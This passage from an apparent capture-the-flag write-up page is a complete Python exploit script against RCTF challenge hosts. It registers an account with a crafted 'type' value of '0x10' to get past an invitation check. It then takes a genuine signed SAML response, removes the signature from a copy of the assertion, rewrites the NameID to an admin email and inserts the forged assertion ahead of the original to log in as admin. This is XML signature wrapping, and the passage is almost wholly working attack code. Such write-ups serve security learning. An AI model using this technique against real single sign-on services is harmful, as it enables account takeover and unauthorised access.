</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>http.cookiejar</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>IDP_BASE</span> <span class=o>=</span> <span class=s2>&#34;http://auth.rctf.rois.team&#34;</span>
</span></span><span class=line><span class=cl><span class=n>SP_BASE</span> <span class=o>=</span> <span class=s2>&#34;http://auth-flag.rctf.rois.team:26000&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_opener</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>cj</span> <span class=o>=</span> <span class=n>http</span><span class=o>.</span><span class=n>cookiejar</span><span class=o>.</span><span class=n>CookieJar</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>opener</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>build_opener</span><span class=p>(</span><span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>HTTPCookieProcessor</span><span class=p>(</span><span class=n>cj</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>opener</span><span class=o>.</span><span class=n>addheaders</span> <span class=o>=</span> <span class=p>[(</span><span class=s2>&#34;User-Agent&#34;</span><span class=p>,</span> <span class=s2>&#34;Mozilla/5.0 (saml-exploit)&#34;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>opener</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>random_string</span><span class=p>(</span><span class=n>length</span><span class=o>=</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>length</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>register_invited_user</span><span class=p>(</span><span class=n>opener</span><span class=p>,</span> <span class=n>username</span><span class=p>,</span> <span class=n>email</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>urlencode</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;0x10&#34;</span><span class=p>,</span>  <span class=c1># bypass invite check, but stored as type=0 in MySQL</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;invitationCode&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;email&#34;</span><span class=p>:</span> <span class=n>email</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=n>password</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;confirmPassword&#34;</span><span class=p>:</span> <span class=n>password</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;displayName&#34;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;department&#34;</span><span class=p>:</span> <span class=s2>&#34;IT&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>IDP_BASE</span><span class=si>}</span><span class=s2>/register&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span> <span class=o>=</span> <span class=n>opener</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Register status:&#34;</span><span class=p>,</span> <span class=n>resp</span><span class=o>.</span><span class=n>getcode</span><span class=p>(),</span> <span class=s2>&#34;URL:&#34;</span><span class=p>,</span> <span class=n>resp</span><span class=o>.</span><span class=n>geturl</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;User Registration&#34;</span> <span class=ow>in</span> <span class=n>body</span> <span class=ow>and</span> <span class=s2>&#34;alert-error&#34;</span> <span class=ow>in</span> <span class=n>body</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Registration appears to have failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>body</span><span class=p>[:</span><span class=mi>300</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>(</span><span class=n>opener</span><span class=p>,</span> <span class=n>username</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>urlencode</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=n>password</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>IDP_BASE</span><span class=si>}</span><span class=s2>/login&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span> <span class=o>=</span> <span class=n>opener</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Login status:&#34;</span><span class=p>,</span> <span class=n>resp</span><span class=o>.</span><span class=n>getcode</span><span class=p>(),</span> <span class=s2>&#34;URL:&#34;</span><span class=p>,</span> <span class=n>resp</span><span class=o>.</span><span class=n>geturl</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;Invalid username or password&#34;</span> <span class=ow>in</span> <span class=n>body</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Login failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_legit_saml_response</span><span class=p>(</span><span class=n>opener</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>IDP_BASE</span><span class=si>}</span><span class=s2>/saml/idp/Flag&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span> <span class=o>=</span> <span class=n>opener</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>html</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] IdP-initiated SSO status:&#34;</span><span class=p>,</span> <span class=n>resp</span><span class=o>.</span><span class=n>getcode</span><span class=p>(),</span> <span class=s2>&#34;URL:&#34;</span><span class=p>,</span> <span class=n>resp</span><span class=o>.</span><span class=n>geturl</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;Access Denied&#34;</span> <span class=ow>in</span> <span class=n>html</span> <span class=ow>or</span> <span class=s2>&#34;do not have permission&#34;</span> <span class=ow>in</span> <span class=n>html</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] No permission to access SAML service&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>html</span><span class=p>[:</span><span class=mi>300</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;name=&#34;SAMLResponse&#34;\s+value=&#34;([^&#34;]+)&#34;&#39;</span><span class=p>,</span> <span class=n>html</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>m</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Could not find SAMLResponse in HTML. Snippet:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>html</span><span class=p>[:</span><span class=mi>500</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>saml_response</span> <span class=o>=</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Extracted SAMLResponse length:&#34;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>saml_response</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>saml_response</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_malicious_saml_response</span><span class=p>(</span><span class=n>orig_b64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>xml</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>orig_b64</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Failed to decode original SAMLResponse:&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>start</span> <span class=o>=</span> <span class=n>xml</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;&lt;saml:Assertion&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>start</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] No &lt;saml:Assertion&gt; found in SAML response&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>end</span> <span class=o>=</span> <span class=n>xml</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;&lt;/saml:Assertion&gt;&#34;</span><span class=p>,</span> <span class=n>start</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>end</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] Unterminated &lt;saml:Assertion&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>end</span> <span class=o>+=</span> <span class=nb>len</span><span class=p>(</span><span class=s2>&#34;&lt;/saml:Assertion&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>assertion_xml</span> <span class=o>=</span> <span class=n>xml</span><span class=p>[</span><span class=n>start</span><span class=p>:</span><span class=n>end</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Remove the signature from the copied assertion (we keep it only on the original one)</span>
</span></span><span class=line><span class=cl>    <span class=n>assertion_no_sig</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>sub</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>r</span><span class=s2>&#34;&lt;ds:Signature.*?&lt;/ds:Signature&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>assertion_xml</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>flags</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>S</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Change NameID to admin email</span>
</span></span><span class=line><span class=cl>    <span class=n>assertion_admin</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>sub</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>r</span><span class=s2>&#34;(&lt;saml:NameID[^&gt;]*&gt;)(.*?)(&lt;/saml:NameID&gt;)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=sa>r</span><span class=s2>&#34;\1admin@rois.team\3&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>assertion_no_sig</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>count</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>flags</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>S</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Remove ID attribute to avoid conflicts and signing</span>
</span></span><span class=line><span class=cl>    <span class=n>assertion_admin</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>sub</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;\sID=&#34;[^&#34;]+&#34;&#39;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=n>assertion_admin</span><span class=p>,</span> <span class=n>count</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Insert malicious assertion before the original one</span>
</span></span><span class=line><span class=cl>    <span class=n>manipulated_xml</span> <span class=o>=</span> <span class=n>xml</span><span class=p>[:</span><span class=n>start</span><span class=p>]</span> <span class=o>+</span> <span class=n>assertion_admin</span> <span class=o>+</span> <span class=n>xml</span><span class=p>[</span><span class=n>start</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>new_b64</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>manipulated_xml</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>new_b64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_to_sp</span><span class=p>(</span><span class=n>saml_response_b64</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>opener_sp</span> <span class=o>=</span> <span class=n>make_opener</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>urlencode</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;SAMLResponse&#34;</span><span class=p>:</span> <span class=n>saml_response_b64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>SP_BASE</span><span class=si>}</span><span class=s2>/saml/acs&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span> <span class=o>=</span> <span class=n>opener_sp</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>final_url</span> <span class=o>=</span> <span class=n>resp</span><span class=o>.</span><span class=n>geturl</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Final URL after ACS:&#34;</span><span class=p>,</span> <span class=n>final_url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Response body (first 500 chars):&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>body</span><span class=p>[:</span><span class=mi>500</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>m_flag</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;(RCTF</span><span class=se>\\</span><span class=s2>{[^}]+</span><span class=se>\\</span><span class=s2>})&#34;</span><span class=p>,</span> <span class=n>body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>m_flag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] FLAG:&#34;</span><span class=p>,</span> <span class=n>m_flag</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] FLAG pattern not found in response&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=s2>&#34;evil_&#34;</span> <span class=o>+</span> <span class=n>random_string</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>email</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>username</span><span class=si>}</span><span class=s2>@example.com&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;Password123!&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Using username:&#34;</span><span class=p>,</span> <span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>opener</span> <span class=o>=</span> <span class=n>make_opener</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 1) Register user with crafted type</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>register_invited_user</span><span class=p>(</span><span class=n>opener</span><span class=p>,</span> <span class=n>username</span><span class=p>,</span> <span class=n>email</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 2) New opener (fresh session) and login so userType comes from DB (type=0)</span>
</span></span><span class=line><span class=cl>    <span class=n>opener</span> <span class=o>=</span> <span class=n>make_opener</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>login</span><span class=p>(</span><span class=n>opener</span><span class=p>,</span> <span class=n>username</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 3) Get legitimate SAMLResponse for this user</span>
</span></span><span class=line><span class=cl>    <span class=n>legit_b64</span> <span class=o>=</span> <span class=n>get_legit_saml_response</span><span class=p>(</span><span class=n>opener</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>legit_b64</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 4) Build malicious wrapped SAMLResponse with NameID=admin@rois.team</span>
</span></span><span class=line><span class=cl>    <span class=n>evil_b64</span> <span class=o>=</span> <span class=n>build_malicious_saml_response</span><span class=p>(</span><span class=n>legit_b64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>evil_b64</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Built malicious SAMLResponse, length:&#34;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>evil_b64</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 5) Send to SP and print flag</span>
</span></span><span class=line><span class=cl>    <span class=n>send_to_sp</span><span class=p>(</span><span class=n>evil_b64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
